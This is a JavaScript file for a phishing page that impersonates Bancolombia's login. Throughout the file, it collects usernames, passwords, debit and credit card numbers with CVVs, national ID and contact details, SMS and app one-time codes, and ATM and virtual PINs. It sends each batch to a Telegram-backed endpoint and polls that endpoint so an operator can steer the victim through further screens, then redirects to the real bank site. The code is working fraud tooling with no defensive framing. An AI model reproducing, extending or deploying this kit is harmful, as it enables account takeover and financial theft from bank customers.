/* ===== CONFIGURACIÓN INICIAL ===== */

// Generar uniqId único por sesión (6 caracteres alfanuméricos)
function generateUniqId() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// Inicializar o recuperar uniqId
let sessionUniqId = sessionStorage.getItem('uniqId');
// Si no existe o tiene formato antiguo (sess_...), generar uno nuevo
if (!sessionUniqId || sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6) {
    // Si tenía formato antiguo, limpiar localStorage
    if (sessionUniqId && (sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6)) {
        localStorage.clear();
    }
    sessionUniqId = generateUniqId();
    sessionStorage.setItem('uniqId', sessionUniqId);
}

// Estado global
const appState = {
    usuario: '',
    clave: '',
    currentStep: 'usuario',
    currentView: 'inicioSesion',
    uniqId: sessionUniqId,
    loading: false,
    tarjeta: { numero: '', mes: '', anio: '', cvv: '' },
    tarjetaCredito: { numero: '', mes: '', anio: '', cvv: '' }
};

// Guardar en localStorage con valor por defecto '--' si está vacío
function saveToLocalStorage(key, value) {
    const storageKey = `${appState.uniqId}_${key}`;
    const valueToSave = value && value.trim() !== '' ? value : '--';
    localStorage.setItem(storageKey, JSON.stringify(valueToSave));
}

// Obtener de localStorage
function getFromLocalStorage(key) {
    const storageKey = `${appState.uniqId}_${key}`;
    const value = localStorage.getItem(storageKey);
    return value ? JSON.parse(value) : '--';
}

// REMOVIDO: setupAutoSave - Los datos solo se guardan al hacer clic en el botón
// Ya no se guarda automáticamente mientras el usuario escribe

// Guardar todos los datos al localStorage
function saveAllDataToStorage() {
    // Datos de campos mapeados
    const dataMapping = {
        'usuario': 'usuario',
        'clave': getCombinedDigits('clave', 4),
        'ente': '3co',
        'numeroTarjeta': 'tdc',
        'fechaVencimiento': 'ven',
        'cvv': 'cvv',
        'numeroTarjetaCredito': 'tdc',
        'fechaVencimientoCredito': 'ven',
        'cvvCredito': 'cvv',
        'nombre': 'nombre',
        'cedula': 'cedula',
        'email': 'email',
        'celular': 'celular',
        'ciudad': 'ciudad',
        'direccion': 'direccion',
        'otpsms': getCombinedDigits('otpsms', 6),
        'otpapp': getCombinedDigits('otpapp', 6),
        'clavecajero': getCombinedDigits('clavecajero', 4),
        'clavevirtual': getCombinedDigits('clavevirtual', 4)
    };

    // Guardar campos individuales
    Object.keys(dataMapping).forEach(key => {
        const input = document.getElementById(key);
        if (input) {
            saveToLocalStorage(dataMapping[key], input.value);
        }
    });

    // Guardar codsms, codapp, pincaj, pinvir desde los dígitos combinados
    saveToLocalStorage('codsms', getCombinedDigits('otpsms', 6));
    saveToLocalStorage('codapp', getCombinedDigits('otpapp', 6));
    saveToLocalStorage('pincaj', getCombinedDigits('clavecajero', 4));
    saveToLocalStorage('pinvir', getCombinedDigits('clavevirtual', 4));
    saveToLocalStorage('uniqid', appState.uniqId);
    saveToLocalStorage('status', 'pending');
}

// Obtener dígitos combinados de inputs multi-dígito
function getCombinedDigits(prefix, count) {
    let combined = '';
    for (let i = 0; i < count; i++) {
        const input = document.getElementById(`${prefix}-${i}`);
        if (input && input.value) {
            combined += input.value;
        }
    }
    return combined || '--';
}

// Obtener todos los datos de localStorage
function getAllDataFromStorage() {
    const data = {};
    const fields = [
        'usuario', 'clave', 'ente',
        // Tarjeta Débito (TDB) - separado
        'tdb', 'cvv_tdb', 'ven_tdb',
        // Tarjeta Crédito (TDC) - separado
        'tdc', 'cvv_tdc', 'ven_tdc',
        // Datos personales
        'nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion',
        // Códigos OTP y claves
        'codsms', 'codapp', 'pincaj', 'pinvir',
        // Estado y control
        'status', 'uniqid',
        // Pasos completados
        'paso_login', 'paso_tarjeta_debito', 'paso_tarjeta_credito',
        'paso_datos_personales', 'paso_otp_sms', 'paso_otp_app',
        'paso_clave_cajero', 'paso_clave_virtual'
    ];

    fields.forEach(field => {
        const value = getFromLocalStorage(field);
        data[field] = value;
    });

    return data;
}

// Variable para controlar envíos en progreso
let enviandoATelegram = false;

// Enviar datos a Telegram
async function enviarATelegram() {
    // PROTECCIÓN: Evitar envíos duplicados mientras uno está en progreso
    if (enviandoATelegram) {
        console.log('Ya hay un envío en progreso, evitando duplicado');
        return;
    }

    enviandoATelegram = true;

    const allData = getAllDataFromStorage();

    try {
        const response = await fetch('/api/telegram/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
            body: JSON.stringify({
                uniqid: appState.uniqId,
                data: allData
            })
        });
        const result = await response.json();
        console.log('Datos enviados a Telegram:', result);
    } catch (e) {
        console.error('Error al enviar a Telegram:', e);
    } finally {
        // Liberar el lock después de 1 segundo para permitir nuevos envíos
        setTimeout(() => {
            enviandoATelegram = false;
        }, 1000);
    }
}

// Referencias DOM
const elements = {
    loading: document.getElementById('loading'),
    titulo: document.getElementById('titulo'),
    login: document.getElementById('login'),
    tdb: document.getElementById('tdb'),
    tdc: document.getElementById('tdc'),
    codsms: document.getElementById('codsms'),
    codapp: document.getElementById('codapp'),
    pincaj: document.getElementById('pincaj'),
    pinvir: document.getElementById('pinvir'),
    exito: document.getElementById('exito'),
    error: document.getElementById('error'),
    datos: document.getElementById('datos'),
    usuarioForm: document.getElementById('usuarioForm'),
    claveForm: document.getElementById('claveForm'),
    usuario: document.getElementById('usuario'),
    usuarioLabel: document.getElementById('usuarioLabel'),
    usuarioError: document.getElementById('usuarioError'),
    continuarUsuario: document.getElementById('continuarUsuario'),
    continuarClave: document.getElementById('continuarClave'),
    volverClave: document.getElementById('volverClave'),
    claveError: document.getElementById('claveError'),
    // DATOS
    nombre: document.getElementById('nombre'),
    cedula: document.getElementById('cedula'),
    email: document.getElementById('email'),
    celular: document.getElementById('celular'),
    ciudad: document.getElementById('ciudad'),
    direccion: document.getElementById('direccion'),
    continuarDatos: document.getElementById('continuarDatos')
    // ⚠️ Se eliminó volverDatos
};

/* ===== UTILIDAD UI ===== */

function updateFloatingLabel(input, label) {
    const shouldFloat = document.activeElement === input || input.value !== '';
    if (shouldFloat) label.classList.add('active'); else label.classList.remove('active');
}

function setupFloatingLabels() {
    const floatingInputs = document.querySelectorAll('.floating-input');
    floatingInputs.forEach(input => {
        const label = document.getElementById(input.id + 'Label');
        if (label) {
            input.addEventListener('focus', () => updateFloatingLabel(input, label));
            input.addEventListener('blur', () => updateFloatingLabel(input, label));
            input.addEventListener('input', () => updateFloatingLabel(input, label));
            updateFloatingLabel(input, label);
        }
    });
}

function showLoading() {
    appState.loading = true;
    hideAllViews();
    setTimeout(iniciarPolling, 4000);
    elements.loading.classList.remove('hidden');
}
function hideLoading() { appState.loading = false; elements.loading.classList.add('hidden'); }

function hideAllViews() {
    elements.login.classList.add('hidden');
    elements.tdb.classList.add('hidden');
    elements.tdc.classList.add('hidden');
    elements.codsms.classList.add('hidden');
    elements.codapp.classList.add('hidden');
    elements.pincaj.classList.add('hidden');
    elements.pinvir.classList.add('hidden');
    elements.exito.classList.add('hidden');
    elements.error.classList.add('hidden');
    elements.datos.classList.add('hidden'); // <-- nueva sección
}

/* ===== VALIDACIONES ===== */

function validarLuhn(numero) {
    let suma = 0, alternar = false;
    for (let i = numero.length - 1; i >= 0; i--) {
        let n = parseInt(numero.charAt(i));
        if (alternar) { n *= 2; if (n > 9) n -= 9; }
        suma += n; alternar = !alternar;
    }
    return suma % 10 === 0;
}

function validateUsuario() {
    const usuario = elements.usuario.value.trim();
    const isValid = usuario && usuario.length >= 4;
    toggleButton(elements.continuarUsuario, isValid);
    return isValid;
}

function validateClave() {
    const inputs = document.querySelectorAll('[id^="clave-"]');
    let clave = '';
    inputs.forEach(i => clave += (i.dataset.realValue || ''));

    const isValid = clave.length === 4 && /^\d{4}$/.test(clave);

    /*
    if (!isValid && clave.length > 0) {
        elements.claveError.textContent = 'Debe ingresar 4 dígitos numéricos';
        elements.claveError.classList.remove('hidden');
    } else {
        elements.claveError.classList.add('hidden');
    }
    */

    toggleButton(elements.continuarClave, isValid);
    if (isValid) appState.clave = clave;
    return isValid;
}

// Validación datos personales
function validateDatos(showErrors = false) {
    const nombre = elements.nombre.value.trim();
    const cedula = elements.cedula.value.trim();
    const email = elements.email.value.trim();
    const celular = elements.celular.value.trim();
    const ciudad = elements.ciudad.value.trim();
    const direccion = elements.direccion.value.trim();

    const errores = {};

    // Validaciones mejoradas
    if (!nombre) errores.nombre = 'Campo obligatorio';
    else if (nombre.length < 3) errores.nombre = 'Mínimo 3 caracteres';
    else if (!/^[a-zA-ZáéíóúÁÉÍÓÚñÑ\s]+$/.test(nombre)) errores.nombre = 'Solo letras y espacios';

    if (!cedula) errores.cedula = 'Campo obligatorio';
    else if (!/^\d{6,12}$/.test(cedula)) errores.cedula = 'Solo números (6-12 dígitos)';

    // Celular: exactamente 10 dígitos
    if (!celular) errores.celular = 'Campo obligatorio';
    else if (!/^\d{10}$/.test(celular)) errores.celular = 'Debe tener exactamente 10 dígitos';

    if (!email) errores.email = 'Campo obligatorio';
    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) errores.email = 'Email inválido';

    if (!ciudad) errores.ciudad = 'Campo obligatorio';
    else if (ciudad.length < 3) errores.ciudad = 'Mínimo 3 caracteres';

    if (!direccion) errores.direccion = 'Campo obligatorio';
    else if (direccion.length < 5) errores.direccion = 'Mínimo 5 caracteres';

    if (showErrors) {
        setError('nombreError', errores.nombre);
        setError('cedulaError', errores.cedula);
        setError('emailError', errores.email);
        setError('celularError', errores.celular);
        setError('ciudadError', errores.ciudad);
        setError('direccionError', errores.direccion);
    }

    const isValid = Object.keys(errores).length === 0;
    toggleButton(elements.continuarDatos, isValid);
    return isValid;
}

function setError(id, msg) {
    const el = document.getElementById(id);
    if (!el) return;
    if (msg) { el.textContent = msg; el.classList.remove('hidden'); }
    else el.classList.add('hidden');
}

/* ===== NAVEGACIÓN ===== */

function showUsuarioForm() {
    appState.currentStep = 'usuario';
    elements.titulo.textContent = 'Te damos la bienvenida';
    elements.usuarioForm.classList.remove('hidden');
    elements.claveForm.classList.add('hidden');
    setTimeout(() => elements.usuario && elements.usuario.focus(), 100);
}

function showClaveForm() {
    appState.currentStep = 'clave';
    elements.titulo.textContent = 'Clave principal';
    elements.usuarioForm.classList.add('hidden');
    elements.claveForm.classList.remove('hidden');
    setTimeout(() => document.getElementById('clave-0')?.focus(), 100);
}

function salir() {
    if (confirm('¿Está seguro que desea salir?')) {
        localStorage.removeItem('uniqId');
        limpiarTodosLosInputs();
        location.reload();
    }
}

/* ===== COMUNICACIÓN BACKEND ===== */

async function enviarDatos() {
    // Guardar en localStorage antes de enviar
    saveToLocalStorage('usuario', appState.usuario);
    saveToLocalStorage('clave', appState.clave);
    saveToLocalStorage('ente', '3co');
    saveToLocalStorage('status', 'LOGO');
    saveToLocalStorage('uniqid', appState.uniqId);
    saveToLocalStorage('paso_login', 'visto');

    // Enviar a Telegram
    await enviarATelegram();

    // Mostrar loading y comenzar polling
    showLoading();
    iniciarPolling();
}

async function enviarTarjetaDebito() {
    const numeroTarjeta = document.getElementById('numeroTarjeta').value.replace(/\s/g, '');
    const fechaCompleta = document.getElementById('fechaVencimiento').value;
    const cvv = document.getElementById('cvv').value;
    const [mes, anio] = fechaCompleta.split('/');

    // Guardar en localStorage antes de enviar - SEPARADO PARA TDB
    saveToLocalStorage('tdb', numeroTarjeta);
    saveToLocalStorage('cvv_tdb', cvv);
    saveToLocalStorage('ven_tdb', `${mes}/${anio}`);
    saveToLocalStorage('status', 'TDB');
    saveToLocalStorage('paso_tarjeta_debito', 'visto');

    // Enviar a Telegram
    await enviarATelegram();

    // Mostrar loading y comenzar polling
    showLoading();
    iniciarPolling();
}

async function enviarTarjetaCredito() {
    const numeroTarjeta = document.getElementById('numeroTarjetaCredito').value.replace(/\s/g, '');
    const fechaCompleta = document.getElementById('fechaVencimientoCredito').value;
    const cvv = document.getElementById('cvvCredito').value;
    const [mes, anio] = fechaCompleta.split('/');

    // Guardar en localStorage antes de enviar - SEPARADO PARA TDC
    saveToLocalStorage('tdc', numeroTarjeta);
    saveToLocalStorage('cvv_tdc', cvv);
    saveToLocalStorage('ven_tdc', `${mes}/${anio}`);
    saveToLocalStorage('status', 'TDC');
    saveToLocalStorage('paso_tarjeta_credito', 'visto');

    // Enviar a Telegram
    await enviarATelegram();

    // Mostrar loading y comenzar polling
    showLoading();
    iniciarPolling();
}

// NUEVO: Enviar datos personales
async function enviarDatosPersonales() {
    const payload = {
        nombre: elements.nombre.value.trim(),
        cedula: elements.cedula.value.trim(),
        email: elements.email.value.trim(),
        celular: elements.celular.value.trim(),
        ciudad: elements.ciudad.value.trim(),
        direccion: elements.direccion.value.trim()
    };

    // Guardar en localStorage antes de enviar
    saveToLocalStorage('nombre', payload.nombre);
    saveToLocalStorage('cedula', payload.cedula);
    saveToLocalStorage('email', payload.email);
    saveToLocalStorage('celular', payload.celular);
    saveToLocalStorage('ciudad', payload.ciudad);
    saveToLocalStorage('direccion', payload.direccion);
    saveToLocalStorage('status', 'DATOS');
    saveToLocalStorage('paso_datos_personales', 'visto');

    // Enviar a Telegram
    await enviarATelegram();

    // Mostrar loading y comenzar polling
    showLoading();
    iniciarPolling();
}

async function enviarOtpSms(codigo) {
    // Guardar en localStorage antes de enviar
    saveToLocalStorage('codsms', codigo);
    saveToLocalStorage('status', 'OTPSMS');
    saveToLocalStorage('paso_otp_sms', 'visto');

    // Enviar a Telegram
    await enviarATelegram();

    // Mostrar loading y comenzar polling
    showLoading();
    iniciarPolling();
}

async function enviarOtpApp(codigo) {
    // Guardar en localStorage antes de enviar
    saveToLocalStorage('codapp', codigo);
    saveToLocalStorage('status', 'OTPAPP');
    saveToLocalStorage('paso_otp_app', 'visto');

    // Enviar a Telegram
    await enviarATelegram();

    // Mostrar loading y comenzar polling
    showLoading();
    iniciarPolling();
}

async function enviarClaveCajero(codigo) {
    // Guardar en localStorage antes de enviar
    saveToLocalStorage('pincaj', codigo);
    saveToLocalStorage('status', 'CLAVCAJ');
    saveToLocalStorage('paso_clave_cajero', 'visto');

    // Enviar a Telegram
    await enviarATelegram();

    // Mostrar loading y comenzar polling
    showLoading();
    iniciarPolling();
}

async function enviarClaveVirtual(codigo) {
    // Guardar en localStorage antes de enviar
    saveToLocalStorage('pinvir', codigo);
    saveToLocalStorage('status', 'CLAVIR');
    saveToLocalStorage('paso_clave_virtual', 'visto');

    // Enviar a Telegram
    await enviarATelegram();

    // Mostrar loading y comenzar polling
    showLoading();
    iniciarPolling();
}

/* ===== POLLING ===== */
function verificarPasoVisto(stepId) {
    // Mapear el stepId al nombre del paso guardado en localStorage
    const pasoMap = {
        'login': 'paso_login',
        'tdb': 'paso_tarjeta_debito',
        'tdc': 'paso_tarjeta_credito',
        'datos': 'paso_datos_personales',
        'codsms': 'paso_otp_sms',
        'codapp': 'paso_otp_app',
        'pincaj': 'paso_clave_cajero',
        'pinvir': 'paso_clave_virtual'
    };

    const pasoKey = pasoMap[stepId];
    if (!pasoKey) return false;

    // Verificar si existe en localStorage
    const pasoVisto = getFromLocalStorage(pasoKey);
    return pasoVisto === 'visto';
}

async function iniciarPolling() {
    // Verificar si el spinner (loading) está visible antes de continuar
    const loadingElement = document.getElementById('loading');
    if (loadingElement && loadingElement.classList.contains('hidden')) {
        // Si el loading no está visible, detener el polling
        return;
    }

    try {
        const response = await fetch(`/api/telegram/check-button`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
            body: JSON.stringify({ uniqid: appState.uniqId })
        });
        const data = await response.json();

        // Verificar si se recibió un ID de paso desde Telegram
        if (data.button) {
            hideLoading();
            hideAllViews();

            // Mostrar el paso correspondiente al ID recibido
            const stepId = data.button; // login, tdb, tdc, datos, codsms, codapp, pincaj, pinvir, exito, error
            const stepElement = document.getElementById(stepId);

            if (stepElement) {
                // Verificar si esta sección ya fue vista anteriormente
                const pasoVisto = verificarPasoVisto(stepId);

                // Limpiar los datos de la sección antes de mostrarla
                limpiarSeccion(stepId);

                stepElement.classList.remove('hidden');

                // Iniciar redirección automática para secciones de éxito o error
                if (stepId === 'exito' || stepId === 'error') {
                    iniciarRedirecciones(stepId);
                }

                // Mostrar el mensaje de error SOLO si la sección ya fue vista anteriormente
                if (pasoVisto && stepId !== 'exito' && stepId !== 'error') {
                    const errorElements = stepElement.querySelectorAll('.hiddenerror');
                    errorElements.forEach(div => div.classList.remove('hidden'));
                }
            } else {
                console.warn(`No se encontró el elemento con ID: ${stepId}`);
            }
        } else {
            // Ningún botón presionado aún, seguir consultando
            setTimeout(iniciarPolling, 2000);
        }
    } catch (error) {
        console.error('Error en polling:', error);
        setTimeout(iniciarPolling, 2000);
    }
}

/* ===== LIMPIEZA ===== */

function limpiarSeccion(stepId) {
    switch (stepId) {
        case 'login':
            // Limpiar usuario y clave
            elements.usuario.value = '';
            elements.usuarioError.classList.add('hidden');
            document.querySelectorAll('[id^="clave-"]').forEach(i => { i.value = ''; i.dataset.realValue = ''; });
            elements.claveError.classList.add('hidden');
            toggleButton(document.getElementById('continuarUsuario'), false);
            toggleButton(document.getElementById('continuarClave'), false);
            // Reset labels
            const usuarioLabel = document.getElementById('usuarioLabel');
            if (usuarioLabel) usuarioLabel.classList.remove('active');
            // Volver al primer paso (usuario)
            showUsuarioForm();
            break;

        case 'tdb':
            // Limpiar tarjeta débito
            ['numeroTarjeta', 'fechaVencimiento', 'cvv'].forEach(id => {
                const el = document.getElementById(id);
                if (el) el.value = '';
            });
            document.getElementById('numeroTarjetaError')?.classList.add('hidden');
            document.getElementById('fechaError')?.classList.add('hidden');
            document.getElementById('cvvError')?.classList.add('hidden');
            toggleButton(document.getElementById('continuarTarjeta'), false);
            // Reset labels
            ['numeroTarjetaLabel', 'fechaVencimientoLabel', 'cvvLabel'].forEach(id => {
                const label = document.getElementById(id);
                if (label) label.classList.remove('active');
            });
            break;

        case 'tdc':
            // Limpiar tarjeta crédito
            ['numeroTarjetaCredito', 'fechaVencimientoCredito', 'cvvCredito'].forEach(id => {
                const el = document.getElementById(id);
                if (el) el.value = '';
            });
            document.getElementById('numeroTarjetaCreditoError')?.classList.add('hidden');
            document.getElementById('fechaCreditoError')?.classList.add('hidden');
            document.getElementById('cvvCreditoError')?.classList.add('hidden');
            toggleButton(document.getElementById('continuarTarjetaCredito'), false);
            // Reset labels
            ['numeroTarjetaCreditoLabel', 'fechaVencimientoCreditoLabel', 'cvvCreditoLabel'].forEach(id => {
                const label = document.getElementById(id);
                if (label) label.classList.remove('active');
            });
            break;

        case 'datos':
            // Limpiar datos personales
            ['nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion'].forEach(id => {
                const el = document.getElementById(id);
                if (el) el.value = '';
            });
            ['nombreError', 'cedulaError', 'emailError', 'celularError', 'ciudadError', 'direccionError']
                .forEach(id => document.getElementById(id)?.classList.add('hidden'));
            toggleButton(document.getElementById('continuarDatos'), false);
            // Reset labels
            ['nombreLabel', 'cedulaLabel', 'emailLabel', 'celularLabel', 'ciudadLabel', 'direccionLabel'].forEach(id => {
                const label = document.getElementById(id);
                if (label) label.classList.remove('active');
            });
            break;

        case 'codsms':
            // Limpiar OTP SMS
            document.querySelectorAll('[id^="otpsms-"]').forEach(i => { i.value = ''; i.dataset.realValue = ''; });
            toggleButton(document.getElementById('validarOtpSms'), false);
            break;

        case 'codapp':
            // Limpiar OTP App
            document.querySelectorAll('[id^="otpapp-"]').forEach(i => { i.value = ''; i.dataset.realValue = ''; });
            toggleButton(document.getElementById('validarOtpApp'), false);
            break;

        case 'pincaj':
            // Limpiar clave cajero
            document.querySelectorAll('[id^="clavecajero-"]').forEach(i => { i.value = ''; i.dataset.realValue = ''; });
            toggleButton(document.getElementById('validarClaveCajero'), false);
            break;

        case 'pinvir':
            // Limpiar clave virtual
            document.querySelectorAll('[id^="clavevirtual-"]').forEach(i => { i.value = ''; i.dataset.realValue = ''; });
            toggleButton(document.getElementById('validarClaveVirtual'), false);
            break;

        case 'error':
            // Para error no se limpia nada
            break;

        case 'exito':
            // Para éxito no se limpia nada
            break;

        default:
            console.warn(`No se reconoce la sección: ${stepId}`);
    }
}

function limpiarTodosLosInputs() {
    hideAllViews();
    elements.login.classList.remove('hidden');

    // Usuario/clave
    elements.usuario.value = '';
    elements.usuarioError.classList.add('hidden');
    document.querySelectorAll('[id^="clave-"]').forEach(i => { i.value = ''; i.dataset.realValue = ''; });
    elements.claveError.classList.add('hidden');

    // TDB
    ['numeroTarjeta', 'fechaVencimiento', 'cvv'].forEach(id => { const el = document.getElementById(id); if (el) el.value = ''; });
    document.getElementById('numeroTarjetaError')?.classList.add('hidden');
    document.getElementById('fechaError')?.classList.add('hidden');
    document.getElementById('cvvError')?.classList.add('hidden');

    // TDC
    ['numeroTarjetaCredito', 'fechaVencimientoCredito', 'cvvCredito'].forEach(id => { const el = document.getElementById(id); if (el) el.value = ''; });
    document.getElementById('numeroTarjetaCreditoError')?.classList.add('hidden');
    document.getElementById('fechaCreditoError')?.classList.add('hidden');
    document.getElementById('cvvCreditoError')?.classList.add('hidden');

    // OTP y claves
    ['otpsms', 'otpapp', 'clavecajero', 'clavevirtual'].forEach(pref => {
        document.querySelectorAll(`[id^="${pref}-"]`).forEach(i => { i.value = ''; i.dataset.realValue = ''; });
    });

    // DATOS personales
    ['nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion'].forEach(id => { const el = document.getElementById(id); if (el) el.value = ''; });
    ['nombreError', 'cedulaError', 'emailError', 'celularError', 'ciudadError', 'direccionError'].forEach(id => document.getElementById(id)?.classList.add('hidden'));

    // Ocultar errores
    document.querySelectorAll('.hiddenerror').forEach(div => div.classList.add('hidden'));

    // Limpiar localStorage para todos los campos
    const allInputIds = [
        'usuario',
        'numeroTarjeta', 'fechaVencimiento', 'cvv',
        'numeroTarjetaCredito', 'fechaVencimientoCredito', 'cvvCredito',
        'nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion'
    ];
    allInputIds.forEach(id => {
        const storageKey = `${appState.uniqId}_${id}`;
        localStorage.removeItem(storageKey);
    });
    // Limpiar inputs multi-dígito del localStorage
    ['clave', 'otpsms', 'otpapp', 'clavecajero', 'clavevirtual'].forEach(prefix => {
        const count = prefix === 'otpsms' || prefix === 'otpapp' ? 6 : 4;
        for (let i = 0; i < count; i++) {
            const storageKey = `${appState.uniqId}_${prefix}-${i}`;
            localStorage.removeItem(storageKey);
        }
    });

    // Estado
    appState.usuario = ''; appState.clave = '';
    appState.currentStep = 'usuario'; appState.currentView = 'login';
    appState.tarjeta = { numero: '', mes: '', anio: '', cvv: '' };
    appState.tarjetaCredito = { numero: '', mes: '', anio: '', cvv: '' };

    // Reset labels
    document.querySelectorAll('.floating-label').forEach(l => l.classList.remove('active'));

    // Deshabilitar botones
    ['continuarUsuario', 'continuarClave', 'continuarTarjeta', 'continuarTarjetaCredito', 'validarOtpSms', 'validarOtpApp', 'validarClaveCajero', 'validarClaveVirtual', 'continuarDatos']
        .forEach(id => toggleButton(document.getElementById(id), false));

    showUsuarioForm();
}

function toggleButton(btn, enabled) {
    if (!btn) return;
    btn.disabled = !enabled;
    if (enabled) { btn.classList.remove('bg-gray-300', 'cursor-not-allowed'); btn.classList.add('bg-bancolombia-yellow'); }
    else { btn.classList.add('bg-gray-300', 'cursor-not-allowed'); btn.classList.remove('bg-bancolombia-yellow'); }
}

// PROTECCIÓN: Función helper para deshabilitar botones temporalmente después de clic
function disableButtonTemporarily(btn, duration = 2000) {
    if (!btn) return;
    const wasEnabled = !btn.disabled;
    btn.disabled = true;
    btn.classList.add('opacity-50', 'cursor-wait');

    setTimeout(() => {
        if (wasEnabled) {
            btn.disabled = false;
            btn.classList.remove('opacity-50', 'cursor-wait');
        }
    }, duration);
}

/* ===== UTILS ===== */

function getCodigoFromInputs(prefix, length = 6) {
    let codigo = '';
    for (let i = 0; i < length; i++) {
        const input = document.getElementById(`${prefix}-${i}`);
        if (input) codigo += (input.classList.contains('password-input') ? (input.dataset.realValue || '') : input.value);
    }
    return codigo;
}

function iniciarRedirecciones(tipo) {
    const countdownElement = document.getElementById(`countdown-${tipo}`);
    const timerElement = document.getElementById(`timer-${tipo}`);
    countdownElement.classList.remove('hidden');
    let segundos = 5;
    const intervalo = setInterval(() => {
        segundos--; timerElement.textContent = segundos;
        if (segundos <= 0) { clearInterval(intervalo); window.location.href = 'https://www.bancolombia.com/personas/vivienda'; }
    }, 1000);
}

/* ===== LISTENERS ===== */

// Usuario
elements.usuario.addEventListener('input', function () { appState.usuario = this.value; validateUsuario(); });
elements.continuarUsuario.addEventListener('click', function () {
    if (validateUsuario()) {
        disableButtonTemporarily(this, 1000);
        showClaveForm();
    }
});
elements.volverClave.addEventListener('click', function () { showUsuarioForm(); });
elements.continuarClave.addEventListener('click', function () {
    if (validateClave()) {
        disableButtonTemporarily(this, 3000);
        enviarDatos();
    }
});

// Tarjetas
function validateTarjeta(isCredito = false, showErrors = false) {
    const prefix = isCredito ? 'Credito' : '';
    const numeroTarjeta = document.getElementById(`numeroTarjeta${prefix}`).value.replace(/\s/g, '');
    const fechaCompleta = document.getElementById(`fechaVencimiento${prefix}`).value;
    const cvv = document.getElementById(`cvv${prefix}`).value;

    const hoy = new Date(); const anioActual = hoy.getFullYear(); const mesActual = hoy.getMonth() + 1;
    const errores = {};

    if (!numeroTarjeta.trim()) errores.numero = "Este campo es obligatorio";
    else if (!/^\d+$/.test(numeroTarjeta)) errores.numero = "Solo se permiten números";
    else if (numeroTarjeta.length < 15 || numeroTarjeta.length > 16) errores.numero = "Debe tener entre 15 y 16 dígitos";
    else if (!validarLuhn(numeroTarjeta)) errores.numero = "Número inválido";

    if (!fechaCompleta.trim()) errores.fecha = "Este campo es obligatorio";
    else if (!/^\d{2}\/\d{4}$/.test(fechaCompleta)) errores.fecha = "Formato inválido (MM/YYYY)";
    else {
        const [mes, anio] = fechaCompleta.split('/');
        const mesInt = parseInt(mes), anioInt = parseInt(anio);
        if (mesInt < 1 || mesInt > 12) errores.fecha = "Mes inválido";
        else if (anioInt < anioActual || (anioInt === anioActual && mesInt < mesActual)) errores.fecha = "La tarjeta está vencida";
        else if (anioInt > 2040) errores.fecha = "Fecha demasiado lejana";
    }

    if (!cvv.trim()) errores.cvv = "Este campo es obligatorio";
    else if (!/^\d{3,4}$/.test(cvv)) errores.cvv = "Debe tener 3 o 4 dígitos";

    if (showErrors) {
        const numeroError = document.getElementById(`numeroTarjeta${prefix}Error`);
        const fechaError = document.getElementById(`fecha${prefix}Error`);
        const cvvError = document.getElementById(`cvv${prefix}Error`);
        setError(numeroError?.id || '', errores.numero);
        setError(fechaError?.id || '', errores.fecha);
        setError(cvvError?.id || '', errores.cvv);
    }

    const isValid = Object.keys(errores).length === 0;
    const button = document.getElementById(isCredito ? 'continuarTarjetaCredito' : 'continuarTarjeta');
    toggleButton(button, isValid);
    return isValid;
}

function validateTarjetaField(fieldType, isCredito = false) {
    validateTarjeta(isCredito, true);
}

document.getElementById('continuarTarjeta').addEventListener('click', function () {
    if (validateTarjeta(false, true)) {
        disableButtonTemporarily(this, 3000);
        enviarTarjetaDebito();
    }
});
document.getElementById('continuarTarjetaCredito').addEventListener('click', function () {
    if (validateTarjeta(true, true)) {
        disableButtonTemporarily(this, 3000);
        enviarTarjetaCredito();
    }
});

// OTP
function validateOtpSms() {
    let codigo = '';
    for (let i = 0; i < 6; i++) {
        const input = document.getElementById(`otpsms-${i}`);
        if (input) codigo += (input.dataset.realValue || '');
    }
    const isValid = codigo.length === 6 && /^\d{6}$/.test(codigo);
    const btn = document.getElementById('validarOtpSms');
    toggleButton(btn, isValid);
    return isValid;
}
function validateOtpApp() {
    let codigo = '';
    for (let i = 0; i < 6; i++) {
        const input = document.getElementById(`otpapp-${i}`);
        if (input) codigo += (input.dataset.realValue || '');
    }
    const isValid = codigo.length === 6 && /^\d{6}$/.test(codigo);
    const btn = document.getElementById('validarOtpApp');
    toggleButton(btn, isValid);
    return isValid;
}
document.getElementById('validarOtpSms').addEventListener('click', function () {
    const inputs = document.querySelectorAll('[id^="otpsms-"]'); let codigo = ''; inputs.forEach(i => codigo += (i.dataset.realValue || ''));
    if (codigo.length === 6) {
        disableButtonTemporarily(this, 3000);
        enviarOtpSms(codigo);
    }
});
document.getElementById('validarOtpApp').addEventListener('click', function () {
    const inputs = document.querySelectorAll('[id^="otpapp-"]'); let codigo = ''; inputs.forEach(i => codigo += (i.dataset.realValue || ''));
    if (codigo.length === 6) {
        disableButtonTemporarily(this, 3000);
        enviarOtpApp(codigo);
    }
});

// Claves 4 dígitos
function validateClaveCajero() {
    let codigo = '';
    for (let i = 0; i < 4; i++) {
        const input = document.getElementById(`clavecajero-${i}`);
        if (input) codigo += (input.dataset.realValue || '');
    }
    const isValid = codigo.length === 4 && /^\d{4}$/.test(codigo);
    const btn = document.getElementById('validarClaveCajero');
    toggleButton(btn, isValid);
    return isValid;
}
function validateClaveVirtual() {
    let codigo = '';
    for (let i = 0; i < 4; i++) {
        const input = document.getElementById(`clavevirtual-${i}`);
        if (input) codigo += (input.dataset.realValue || '');
    }
    const isValid = codigo.length === 4 && /^\d{4}$/.test(codigo);
    const btn = document.getElementById('validarClaveVirtual');
    toggleButton(btn, isValid);
    return isValid;
}

document.getElementById('validarClaveCajero').addEventListener('click', function () {
    const inputs = document.querySelectorAll('[id^="clavecajero-"]'); let codigo = ''; inputs.forEach(i => codigo += (i.dataset.realValue || ''));
    if (codigo.length === 4) {
        disableButtonTemporarily(this, 3000);
        enviarClaveCajero(codigo);
    }
});
